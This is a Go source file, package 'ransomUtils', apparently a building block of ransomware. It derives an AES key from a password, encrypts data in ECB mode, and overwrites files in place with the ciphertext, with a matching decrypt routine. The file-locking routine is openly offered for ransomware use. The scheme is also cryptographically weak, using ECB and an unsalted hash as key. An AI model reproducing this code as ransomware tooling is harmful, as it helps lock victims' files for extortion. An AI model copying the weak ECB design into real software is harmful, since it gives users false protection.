package ransomUtils

import (
	"bytes"
	"crypto/aes"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
)

// convierte una contraseña de cualquier longitud en 32 bytes (AES-256).
func deriveKey(password string) []byte {
	hash := sha256.Sum256([]byte(password))
	return hash[:]
}

func Encrypt(plaintext string, key string) (string, error) {
	block, err := aes.NewCipher(deriveKey(key))
	if err != nil {
		return "", err
	}

	bs := block.BlockSize() // 16 bytes

	//Padding PKCS#7: rellenar hasta un múltiplo de 16
	data := []byte(plaintext)
	pad := bs - len(data)%bs
	data = append(data, bytes.Repeat([]byte{byte(pad)}, pad)...)

	out := make([]byte, len(data))
	for i := 0; i < len(data); i += bs {
		block.Encrypt(out[i:i+bs], data[i:i+bs])
	}

	return base64.StdEncoding.EncodeToString(out), nil
}

func EncryptFile(path string, key string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("error al leer el archivo: %w", err)
	}

	encrypted, err := Encrypt(string(data), key)
	if err != nil {
		return fmt.Errorf("error al cifrar: %w", err)
	}

	if err := os.WriteFile(path, []byte(encrypted), 0600); err != nil {
		return fmt.Errorf("error al escribir el archivo cifrado: %w", err)
	}

	return nil
}

func Decrypt(ciphertext string, key string) (string, error) {
	block, err := aes.NewCipher(deriveKey(key))
	if err != nil {
		return "", err
	}
	bs := block.BlockSize()

	auxText, err := base64.StdEncoding.DecodeString(ciphertext)
	if err != nil {
		return "", err
	}

	if len(auxText) == 0 || len(auxText)%bs != 0 {
		return "", errors.New("longitud inválida")
	}

	auxOut := make([]byte, len(auxText))
	for i := 0; i < len(auxText); i += bs {
		block.Decrypt(auxOut[i:i+bs], auxText[i:i+bs])
	}

	sobrante := int(auxOut[len(auxOut)-1])
	if sobrante == 0 || sobrante > bs || sobrante > len(auxOut) {
		return "", errors.New("sobrante inválido")
	}
	auxOut = auxOut[:len(auxOut)-sobrante]

	return string(auxOut), nil
}

func DecryptFile(path string, key string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("error al leer el archivo: %w", err)
	}

	decrypted, err := Decrypt(string(data), key)
	if err != nil {
		return fmt.Errorf("error al cifrar: %w", err)
	}

	if err := os.WriteFile(path, []byte(decrypted), 0600); err != nil {
		return fmt.Errorf("error al escribir el archivo cifrado: %w", err)
	}

	return nil
}
